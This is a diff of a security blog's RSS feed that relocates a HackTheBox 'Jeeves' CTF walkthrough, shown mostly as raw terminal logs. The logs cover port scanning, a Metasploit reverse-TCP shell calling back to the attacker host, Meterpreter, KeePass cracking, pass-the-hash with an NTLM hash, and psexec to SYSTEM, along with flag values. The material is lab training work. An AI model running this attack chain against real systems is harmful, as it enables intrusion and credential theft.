@@ -3739,17 +3739,6 @@ Versuchen wir mal unser Glück.</p>
         </item>
         
         <item>
-            <title>First post</title>
-            <link>https://www.m10x.de/posts/2010/01/first-post/</link>
-            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
-            
-            <guid>https://www.m10x.de/posts/2010/01/first-post/</guid>
-            <description></description>
-            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
-]]></content>
-        </item>
-        
-        <item>
             <title>HackTheBox - Celestial</title>
             <link>https://www.m10x.de/posts/2010/01/hackthebox-celestial/</link>
             <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
@@ -4993,6 +4982,268 @@ bdc 30e</p>
         </item>
         
         <item>
+            <title>HackTheBox Jeeves</title>
+            <link>https://www.m10x.de/posts/2010/01/hackthebox-jeeves/</link>
+            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
+            
+            <guid>https://www.m10x.de/posts/2010/01/hackthebox-jeeves/</guid>
+            <description>root@kali:~/htb/jeeves# nmap -p- 10.10.10.63 [19/19]
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 19:02 CEST
+Nmap scan report for 10.10.10.63
+Host is up (0.078s latency).
+Not shown: 65531 filtered ports
+PORT STATE SERVICE
+80/tcp open http
+135/tcp open msrpc
+445/tcp open microsoft-ds
+50000/tcp open ibm-db2
+Nmap done: 1 IP address (1 host up) scanned in 372.85 seconds
+root@kali:~/htb/jeeves# nmap -p80,135,445,50000 -A 10.10.10.63
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 19:10 CEST</description>
+            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+<p><img src="https://imgur.com/lZBhQ23.jpg" alt="5jenkins"></p>
+<p>root@kali:~/htb/jeeves# nmap -p- 10.10.10.63 [19/19]<br>
+Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2018-05-17 19:02 CEST<br>
+Nmap scan report for 10.10.10.63<br>
+Host is up (0.078s latency).<br>
+Not shown: 65531 filtered ports<br>
+PORT STATE SERVICE<br>
+80/tcp open http<br>
+135/tcp open msrpc<br>
+445/tcp open microsoft-ds<br>
+50000/tcp open ibm-db2</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 372.85 seconds<br>
+root@kali:~/htb/jeeves# nmap -p80,135,445,50000 -A 10.10.10.63<br>
+Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2018-05-17 19:10 CEST<br>
+Nmap scan report for 10.10.10.63<br>
+Host is up (0.11s latency).</p>
+<p>PORT STATE SERVICE VERSION<br>
+80/tcp filtered http<br>
+135/tcp open msrpc Microsoft Windows RPC<br>
+445/tcp filtered microsoft-ds<br>
+50000/tcp open http Jetty 9.4.z-SNAPSHOT<br>
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br>
+|_http-title: Error 404 Not Found<br>
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>
+Device type: general purpose<br>
+Running (JUST GUESSING): Microsoft Windows 2008 (89%), FreeBSD 6.X (85%)<br>
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:freebsd:freebsd:6.2<br>
+Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), FreeBSD 6.2-RELEASE (85%)<br>
+No exact OS matches for host (test conditions non-ideal).<br>
+Network Distance: 2 hops<br>
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+<p>TRACEROUTE (using port 135/tcp)<br>
+HOP RTT ADDRESS<br>
+1 65.52 ms 10.10.14.1<br>
+2 273.84 ms 10.10.10.63</p>
+<p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>
+Nmap done: 1 IP address (1 host up) scanned in 20.89 seconds</p>
+<p>root@kali:~/htb/jeeves# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -u http://10.10.10.63:50000</p>
+<h1 id="gobuster-v141-oj-reeves-thecolonial">Gobuster v1.4.1 OJ Reeves (@TheColonial)</h1>
+<h1 id="-status-codes--200204301302307">=====================================================<br>
+[+] Mode : dir<br>
+[+] Url/Domain : http://10.10.10.63:50000/<br>
+[+] Threads : 50<br>
+[+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt<br>
+[+] Status codes : 200,204,301,302,307</h1>
+<p>/askjeeves (Status: 302)</p>
+<p><img src="https://imgur.com/SEgHp6t.jpg" alt="1jenkins"></p>
+<p><img src="https://imgur.com/NRLrVP3.jpg" alt="2jenkins"></p>
+<p><img src="https://imgur.com/JFZAihz.jpg" alt="3jenkins"></p>
+<p>msf &gt; use exploit/multi/handler<br>
+msf exploit(multi/handler) &gt; set lhost 10.10.14.206<br>
+lhost =&gt; 10.10.14.206<br>
+msf exploit(multi/handler) &gt; set lport 44544<br>
+lport =&gt; 44544<br>
+msf exploit(multi/handler) &gt; set payload windows/x64/shell/reverse_tcp<br>
+payload =&gt; windows/x64/shell/reverse_tcp<br>
+msf exploit(multi/handler) &gt; clear<br>
+[*] exec: clear</p>
+<p>msf exploit(multi/handler) &gt; exploit</p>
+<p>[<em>] Started reverse TCP handler on 10.10.14.206:44544<br>
+[</em>] Sending stage (336 bytes) to 10.10.10.63<br>
+[*] Command shell session 5 opened (10.10.14.206:44544 -&gt; 10.10.10.63:49694) at 2018-05-17 20:21:01 +0200</p>
+<p>Microsoft Windows [Version 10.0.10586]<br>
+(c) 2015 Microsoft Corporation. All rights reserved.</p>
+<p>C:\Users\Administrator.jenkins&gt;More?<br>
+More?</p>
+<p>&lsquo;PuGroj&rsquo; is not recognized as an internal or external command,<br>
+operable program or batch file.</p>
+<p>C:\Users\Administrator.jenkins&gt;^Z<br>
+Background session 5? [y/N] y<br>
+msf exploit(multi/handler) &gt; sessions -u 5<br>
+[*] Executing &lsquo;post/multi/manage/shell_to_meterpreter&rsquo; on session(s): [5]</p>
+<p>[<em>] Upgrading session ID: 5<br>
+[</em>] Starting exploit/multi/handler<br>
+[<em>] Started reverse TCP handler on 10.10.14.206:4433<br>
+#&lt;Thread:0x000056306eca6008@/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:93 run&gt; terminated with exception (report_on_exception is true):<br>
+Traceback (most recent call last):<br>
+1: from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb💯in <code>block in spawn'   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:268:in </code>block in cleanup_handler': uninitialized constant Msf::Modules::Mod706f73742f6d756c74692f6d616e6167652f7368656c6c5f746f5f<br>
+6d65746572707265746572::MetasploitModule::HANDLE_TIMEOUT (NameError)<br>
+msf exploit(multi/handler) &gt;<br>
+[</em>] Sending stage (179779 bytes) to 10.10.10.63<br>
+[<em>] Meterpreter session 6 opened (10.10.14.206:4433 -&gt; 10.10.10.63:49695) at 2018-05-17 20:21:31 +0200<br>
+Interrupt: use the &lsquo;exit&rsquo; command to quit<br>
+msf exploit(multi/handler) &gt; sessions -i 6<br>
+[</em>] Starting interaction with 6&hellip;</p>
+<p>meterpreter &gt; getuid<br>
+Server username: JEEVES\kohsuke</p>
+<h1 id="listing-cuserskohsuke">meterpreter &gt; cd C:/Users/kohsuke<br>
+meterpreter &gt; ls<br>
+Listing: C:\Users\kohsuke</h1>
+<p>Mode Size Type Last modified Name</p>
+<hr>
+<p>40777/rwxrwxrwx 0 dir 2017-11-04 03:51:45 +0100 .groovy<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 AppData<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Application Data<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Contacts<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Cookies<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:19:59 +0100 Desktop<br>
+40555/r-xr-xr-x 4096 dir 2017-11-04 04:18:57 +0100 Documents<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Downloads<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Favorites<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:22:42 +0100 Links<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Local Settings<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Music<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Documents<br>
+100666/rw-rw-rw- 786432 fil 2017-12-24 20:38:40 +0100 NTUSER.DAT<br>
+100666/rw-rw-rw- 65536 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TM.blf<br>
+100666/rw-rw-rw- 524288 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TMContainer00000000000000000001.regtrans-ms<br>
+100666/rw-rw-rw- 524288 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TMContainer00000000000000000002.regtrans-ms<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 NetHood<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:22:42 +0100 OneDrive<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 08:10:02 +0100 Pictures<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 PrintHood<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Recent<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Saved Games<br>
+40555/r-xr-xr-x 4096 dir 2017-11-04 04:16:35 +0100 Searches<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 SendTo<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Start Menu<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Templates<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Videos<br>
+100666/rw-rw-rw- 81920 fil 2017-11-04 03:50:40 +0100 ntuser.dat.LOG1<br>
+100666/rw-rw-rw- 163840 fil 2017-11-04 03:50:40 +0100 ntuser.dat.LOG2<br>
+100666/rw-rw-rw- 20 fil 2017-11-04 03:50:40 +0100 ntuser.ini</p>
+<h1 id="listing-cuserskohsukedesktop">meterpreter &gt; cd Desktop<br>
+meterpreter &gt; ls<br>
+Listing: C:\Users\kohsuke\Desktop</h1>
+<p>Mode Size Type Last modified Name</p>
+<hr>
+<p>100666/rw-rw-rw- 282 fil 2017-11-04 04:15:51 +0100 desktop.ini<br>
+100444/r&ndash;r&ndash;r&ndash; 32 fil 2017-11-04 04:22:51 +0100 user.txt</p>
+<p>meterpreter &gt; cd ..<br>
+meterpreter &gt; cd Documents</p>
+<h1 id="listing-cuserskohsukedocuments">meterpreter &gt; ls<br>
+Listing: C:\Users\kohsuke\Documents</h1>
+<p>Mode Size Type Last modified Name</p>
+<hr>
+<p>100666/rw-rw-rw- 2846 fil 2017-09-18 19:43:17 +0200 CEH.kdbx<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Music<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Pictures<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Videos<br>
+100666/rw-rw-rw- 402 fil 2017-11-04 04:15:51 +0100 desktop.ini</p>
+<p>meterpreter &gt; download CEH.kdbx<br>
+[<em>] Downloading: CEH.kdbx -&gt; CEH.kdbx<br>
+[</em>] Downloaded 2.78 KiB of 2.78 KiB (100.0%): CEH.kdbx -&gt; CEH.kdbx<br>
+[*] download : CEH.kdbx -&gt; CEH.kdbx</p>
+<p>root@kali:~/htb/jeeves# ls<br>
+CEH.kdbx<br>
+root@kali:~/htb/jeeves# keepass2john CEH.kdbx &gt; hash<br>
+root@kali:~/htb/jeeves# john &ndash;format=KeePass &ndash;wordlist=/usr/share/wordlists/rockyou.txt hash<br>
+Using default input encoding: UTF-8<br>
+Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])<br>
+Press &lsquo;q&rsquo; or Ctrl-C to abort, almost any other key for status<br>
+moonshine1 (CEH)<br>
+1g 0:00:00:52 DONE (2018-05-17 20:25) 0.01922g/s 1057p/s 1057c/s 1057C/s moonshine1<br>
+Use the &ldquo;&ndash;show&rdquo; option to display all of the cracked passwords reliably<br>
+Session completed<br>
+root@kali:~/htb/jeeves# keepass2 CEH.kdbx</p>
+<p><img src="https://imgur.com/sjSlTdI.jpg" alt="4jenkins"></p>
+<p>root@kali:~/htb/jeeves# smbclient.py <a href="mailto:administrator@10.10.10.63">administrator@10.10.10.63</a> -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00<br>
+Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies</p>
+<p>Type help for list of commands</p>
+<h1 id="help">help</h1>
+<p>open {host,port=445} - opens a SMB connection against the target host/port<br>
+login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it&rsquo;ll be prompted<br>
+kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it&rsquo;ll be prompted. Use the DNS resolvable domain name<br>
+login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes<br>
+logoff - logs off<br>
+shares - list available shares<br>
+use {sharename} - connect to an specific share<br>
+cd {path} - changes the current directory to {path}<br>
+lcd {path} - changes the current local directory to {path}<br>
+pwd - shows current remote directory<br>
+password - changes the user password, the new password will be prompted for input<br>
+ls {wildcard} - lists all the files in the current directory<br>
+rm {file} - removes the selected file<br>
+mkdir {dirname} - creates the directory under the current path<br>
+rmdir {dirname} - removes the directory under the current path<br>
+put {filename} - uploads the filename into the current path<br>
+get {filename} - downloads the filename from the current path<br>
+info - returns NetrServerInfo main results<br>
+who - returns the sessions currently connected at the target host (admin required)<br>
+close - closes the current SMB Session<br>
+exit - terminates the server process (and this session)</p>
+<h1 id="who">who</h1>
+<p>host: \10.10.14.229, user: ADMINISTRATOR, active: 30, idle: 26<br>
+host: \10.10.14.229, user: ADMINISTRATOR, active: 28, idle: 28<br>
+host: \10.10.14.206, user: administrator, active: 21, idle: 0</p>
+<h1 id="password">password</h1>
+<p>New Password:</p>
+<p>msf &gt; use exploit/windows/smb/psexec<br>
+msf exploit(windows/smb/psexec) &gt; show options</p>
+<p>Module options (exploit/windows/smb/psexec):</p>
+<p>Name Current Setting Required Description</p>
+<hr>
+<p>RHOST yes The target address<br>
+RPORT 445 yes The SMB service port (TCP)<br>
+SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing<br>
+SERVICE_DISPLAY_NAME no The service display name<br>
+SERVICE_NAME no The service name<br>
+SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,&hellip;) or a normal read/write folder share<br>
+SMBDomain . no The Windows domain to use for authentication<br>
+SMBPass no The password for the specified username<br>
+SMBUser no The username to authenticate as</p>
+<p>Exploit target:</p>
+<p>Id Name</p>
+<hr>
+<p>0 Automatic</p>
+<p>msf exploit(windows/smb/psexec) &gt; set RHOST 10.10.10.63<br>
+RHOST =&gt; 10.10.10.63<br>
+msf exploit(windows/smb/psexec) &gt; set smbpass 123456<br>
+smbpass =&gt; 123456<br>
+msf exploit(windows/smb/psexec) &gt; set smbuser administrator<br>
+smbuser =&gt; administrator<br>
+msf exploit(windows/smb/psexec) &gt; exploit</p>
+<p>[<em>] Started reverse TCP handler on 10.10.14.206:4444<br>
+[</em>] 10.10.10.63:445 - Connecting to the server&hellip;<br>
+[<em>] 10.10.10.63:445 - Authenticating to 10.10.10.63:445 as user &lsquo;administrator&rsquo;&hellip;<br>
+[</em>] 10.10.10.63:445 - Selecting PowerShell target<br>
+[<em>] 10.10.10.63:445 - Executing the payload&hellip;<br>
+[+] 10.10.10.63:445 - Service start timed out, OK if running a command or non-service executable&hellip;<br>
+[</em>] Sending stage (179779 bytes) to 10.10.10.63<br>
+[*] Meterpreter session 1 opened (10.10.14.206:4444 -&gt; 10.10.10.63:49672) at 2018-05-17 21:14:07 +0200</p>
+<h1 id="listing-cusersadministratordesktop">meterpreter &gt; getuid<br>
+Server username: NT AUTHORITY\SYSTEM<br>
+meterpreter &gt; cd C:/Users/Administrator/Desktop<br>
+meterpreter &gt; ls<br>
+[-] Unknown command: ls.<br>
+meterpreter &gt; ls<br>
+Listing: C:\Users\Administrator\Desktop</h1>
+<p>Mode Size Type Last modified Name</p>
+<hr>
+<p>100666/rw-rw-rw- 797 fil 2017-11-08 15:05:18 +0100 Windows 10 Update Assistant.lnk<br>
+100666/rw-rw-rw- 282 fil 2017-11-04 03:03:17 +0100 desktop.ini<br>
+100444/r&ndash;r&ndash;r&ndash; 36 fil 2017-12-24 08:51:10 +0100 hm.txt</p>
+<p>meterpreter &gt; cat hm.txt<br>
+The flag is elsewhere. Look deeper.</p>
+<p>C:\Users\Administrator\Desktop&gt;more &lt; hm.txt:root.txt<br>
+more &lt; hm.txt:root.txt<br>
+afbc5bd4b615a60648cec41c6ac92530</p>
+]]></content>
+        </item>
+        
+        <item>
             <title>HackTheBox Tally</title>
             <link>https://www.m10x.de/posts/2010/01/hackthebox-tally/</link>
             <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
@@ -5570,268 +5821,6 @@ meterpreter &gt; getuid<br>
 Server username: NT AUTHORITY\SYSTEM</p>
 <p>meterpreter &gt; cat C:\Users\Administrator\Desktop\root.txt<br>
 608#########################3eda</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>HackTheBox Jeeves</title>
-            <link>https://www.m10x.de/posts/1/01/hackthebox-jeeves/</link>
-            <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-            
-            <guid>https://www.m10x.de/posts/1/01/hackthebox-jeeves/</guid>
-            <description>root@kali:~/htb/jeeves# nmap -p- 10.10.10.63 [19/19]
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 19:02 CEST
-Nmap scan report for 10.10.10.63
-Host is up (0.078s latency).
-Not shown: 65531 filtered ports
-PORT STATE SERVICE
-80/tcp open http
-135/tcp open msrpc
-445/tcp open microsoft-ds
-50000/tcp open ibm-db2
-Nmap done: 1 IP address (1 host up) scanned in 372.85 seconds
-root@kali:~/htb/jeeves# nmap -p80,135,445,50000 -A 10.10.10.63
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 19:10 CEST</description>
-            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
-<p><img src="https://imgur.com/lZBhQ23.jpg" alt="5jenkins"></p>
-<p>root@kali:~/htb/jeeves# nmap -p- 10.10.10.63 [19/19]<br>
-Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2018-05-17 19:02 CEST<br>
-Nmap scan report for 10.10.10.63<br>
-Host is up (0.078s latency).<br>
-Not shown: 65531 filtered ports<br>
-PORT STATE SERVICE<br>
-80/tcp open http<br>
-135/tcp open msrpc<br>
-445/tcp open microsoft-ds<br>
-50000/tcp open ibm-db2</p>
-<p>Nmap done: 1 IP address (1 host up) scanned in 372.85 seconds<br>
-root@kali:~/htb/jeeves# nmap -p80,135,445,50000 -A 10.10.10.63<br>
-Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2018-05-17 19:10 CEST<br>
-Nmap scan report for 10.10.10.63<br>
-Host is up (0.11s latency).</p>
-<p>PORT STATE SERVICE VERSION<br>
-80/tcp filtered http<br>
-135/tcp open msrpc Microsoft Windows RPC<br>
-445/tcp filtered microsoft-ds<br>
-50000/tcp open http Jetty 9.4.z-SNAPSHOT<br>
-|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br>
-|_http-title: Error 404 Not Found<br>
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>
-Device type: general purpose<br>
-Running (JUST GUESSING): Microsoft Windows 2008 (89%), FreeBSD 6.X (85%)<br>
-OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:freebsd:freebsd:6.2<br>
-Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), FreeBSD 6.2-RELEASE (85%)<br>
-No exact OS matches for host (test conditions non-ideal).<br>
-Network Distance: 2 hops<br>
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
-<p>TRACEROUTE (using port 135/tcp)<br>
-HOP RTT ADDRESS<br>
-1 65.52 ms 10.10.14.1<br>
-2 273.84 ms 10.10.10.63</p>
-<p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>
-Nmap done: 1 IP address (1 host up) scanned in 20.89 seconds</p>
-<p>root@kali:~/htb/jeeves# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -u http://10.10.10.63:50000</p>
-<h1 id="gobuster-v141-oj-reeves-thecolonial">Gobuster v1.4.1 OJ Reeves (@TheColonial)</h1>
-<h1 id="-status-codes--200204301302307">=====================================================<br>
-[+] Mode : dir<br>
-[+] Url/Domain : http://10.10.10.63:50000/<br>
-[+] Threads : 50<br>
-[+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt<br>
-[+] Status codes : 200,204,301,302,307</h1>
-<p>/askjeeves (Status: 302)</p>
-<p><img src="https://imgur.com/SEgHp6t.jpg" alt="1jenkins"></p>
-<p><img src="https://imgur.com/NRLrVP3.jpg" alt="2jenkins"></p>
-<p><img src="https://imgur.com/JFZAihz.jpg" alt="3jenkins"></p>
-<p>msf &gt; use exploit/multi/handler<br>
-msf exploit(multi/handler) &gt; set lhost 10.10.14.206<br>
-lhost =&gt; 10.10.14.206<br>
-msf exploit(multi/handler) &gt; set lport 44544<br>
-lport =&gt; 44544<br>
-msf exploit(multi/handler) &gt; set payload windows/x64/shell/reverse_tcp<br>
-payload =&gt; windows/x64/shell/reverse_tcp<br>
-msf exploit(multi/handler) &gt; clear<br>
-[*] exec: clear</p>
-<p>msf exploit(multi/handler) &gt; exploit</p>
-<p>[<em>] Started reverse TCP handler on 10.10.14.206:44544<br>
-[</em>] Sending stage (336 bytes) to 10.10.10.63<br>
-[*] Command shell session 5 opened (10.10.14.206:44544 -&gt; 10.10.10.63:49694) at 2018-05-17 20:21:01 +0200</p>
-<p>Microsoft Windows [Version 10.0.10586]<br>
-(c) 2015 Microsoft Corporation. All rights reserved.</p>
-<p>C:\Users\Administrator.jenkins&gt;More?<br>
-More?</p>
-<p>&lsquo;PuGroj&rsquo; is not recognized as an internal or external command,<br>
-operable program or batch file.</p>
-<p>C:\Users\Administrator.jenkins&gt;^Z<br>
-Background session 5? [y/N] y<br>
-msf exploit(multi/handler) &gt; sessions -u 5<br>
-[*] Executing &lsquo;post/multi/manage/shell_to_meterpreter&rsquo; on session(s): [5]</p>
-<p>[<em>] Upgrading session ID: 5<br>
-[</em>] Starting exploit/multi/handler<br>
-[<em>] Started reverse TCP handler on 10.10.14.206:4433<br>
-#&lt;Thread:0x000056306eca6008@/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:93 run&gt; terminated with exception (report_on_exception is true):<br>
-Traceback (most recent call last):<br>
-1: from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb💯in <code>block in spawn'   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:268:in </code>block in cleanup_handler': uninitialized constant Msf::Modules::Mod706f73742f6d756c74692f6d616e6167652f7368656c6c5f746f5f<br>
-6d65746572707265746572::MetasploitModule::HANDLE_TIMEOUT (NameError)<br>
-msf exploit(multi/handler) &gt;<br>
-[</em>] Sending stage (179779 bytes) to 10.10.10.63<br>
-[<em>] Meterpreter session 6 opened (10.10.14.206:4433 -&gt; 10.10.10.63:49695) at 2018-05-17 20:21:31 +0200<br>
-Interrupt: use the &lsquo;exit&rsquo; command to quit<br>
-msf exploit(multi/handler) &gt; sessions -i 6<br>
-[</em>] Starting interaction with 6&hellip;</p>
-<p>meterpreter &gt; getuid<br>
-Server username: JEEVES\kohsuke</p>
-<h1 id="listing-cuserskohsuke">meterpreter &gt; cd C:/Users/kohsuke<br>
-meterpreter &gt; ls<br>
-Listing: C:\Users\kohsuke</h1>
-<p>Mode Size Type Last modified Name</p>
-<hr>
-<p>40777/rwxrwxrwx 0 dir 2017-11-04 03:51:45 +0100 .groovy<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 AppData<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Application Data<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Contacts<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Cookies<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:19:59 +0100 Desktop<br>
-40555/r-xr-xr-x 4096 dir 2017-11-04 04:18:57 +0100 Documents<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Downloads<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Favorites<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:22:42 +0100 Links<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Local Settings<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Music<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Documents<br>
-100666/rw-rw-rw- 786432 fil 2017-12-24 20:38:40 +0100 NTUSER.DAT<br>
-100666/rw-rw-rw- 65536 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TM.blf<br>
-100666/rw-rw-rw- 524288 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TMContainer00000000000000000001.regtrans-ms<br>
-100666/rw-rw-rw- 524288 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TMContainer00000000000000000002.regtrans-ms<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 NetHood<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:22:42 +0100 OneDrive<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 08:10:02 +0100 Pictures<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 PrintHood<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Recent<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Saved Games<br>
-40555/r-xr-xr-x 4096 dir 2017-11-04 04:16:35 +0100 Searches<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 SendTo<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Start Menu<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Templates<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Videos<br>
-100666/rw-rw-rw- 81920 fil 2017-11-04 03:50:40 +0100 ntuser.dat.LOG1<br>
-100666/rw-rw-rw- 163840 fil 2017-11-04 03:50:40 +0100 ntuser.dat.LOG2<br>
-100666/rw-rw-rw- 20 fil 2017-11-04 03:50:40 +0100 ntuser.ini</p>
-<h1 id="listing-cuserskohsukedesktop">meterpreter &gt; cd Desktop<br>
-meterpreter &gt; ls<br>
-Listing: C:\Users\kohsuke\Desktop</h1>
-<p>Mode Size Type Last modified Name</p>
-<hr>
-<p>100666/rw-rw-rw- 282 fil 2017-11-04 04:15:51 +0100 desktop.ini<br>
-100444/r&ndash;r&ndash;r&ndash; 32 fil 2017-11-04 04:22:51 +0100 user.txt</p>
-<p>meterpreter &gt; cd ..<br>
-meterpreter &gt; cd Documents</p>
-<h1 id="listing-cuserskohsukedocuments">meterpreter &gt; ls<br>
-Listing: C:\Users\kohsuke\Documents</h1>
-<p>Mode Size Type Last modified Name</p>
-<hr>
-<p>100666/rw-rw-rw- 2846 fil 2017-09-18 19:43:17 +0200 CEH.kdbx<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Music<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Pictures<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Videos<br>
-100666/rw-rw-rw- 402 fil 2017-11-04 04:15:51 +0100 desktop.ini</p>
-<p>meterpreter &gt; download CEH.kdbx<br>
-[<em>] Downloading: CEH.kdbx -&gt; CEH.kdbx<br>
-[</em>] Downloaded 2.78 KiB of 2.78 KiB (100.0%): CEH.kdbx -&gt; CEH.kdbx<br>
-[*] download : CEH.kdbx -&gt; CEH.kdbx</p>
-<p>root@kali:~/htb/jeeves# ls<br>
-CEH.kdbx<br>
-root@kali:~/htb/jeeves# keepass2john CEH.kdbx &gt; hash<br>
